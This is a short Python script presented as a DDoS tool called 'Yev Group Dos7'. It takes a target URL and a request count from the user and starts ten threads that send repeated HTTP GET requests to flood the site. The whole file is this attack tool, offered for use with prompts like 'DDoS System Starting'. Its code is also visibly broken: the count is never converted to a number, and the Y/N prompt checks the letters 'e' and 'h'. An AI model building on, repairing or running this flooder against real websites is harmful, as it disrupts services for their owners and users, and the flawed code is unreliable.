import requests
import time
import threading
def proceed():
    while True:
        decision = input("Wanna Starting?(Y/N): ").strip().lower()
        if decision == 'e':
            print("Welcome To Yev Group Dos7 System... Wait 6 Seconds")
            time.sleep(6)
            print("DDoS System Starting...")
            time.sleep(2)
            print("Servers Starting..")
            time.sleep(2)

            target_url = input("Target(with https):")
            print("Wait For Access")
            time.sleep(2)
            print("Enjoy")

            
            num_requests = input("Request Number:")

        
            def send_request():
                for _ in range(num_requests):
                    try:
                        response = requests.get(target_url)
                        print(f"Response: {response.status_code}")
                    except Exception as e:
                        print(f"Error: {e}")

            
            threads = []
            for _ in range(10):  #
                thread = threading.Thread(target=send_request)
                threads.append(thread)
                thread.start()

            
            for thread in threads:
                thread.join()

            break
        elif decision == 'h':
            print("System Closed")
            break
        else:
            print("Invalid Input Choice Y or N")


proceed()

#Yev Group GPL3 Dos7 Request System
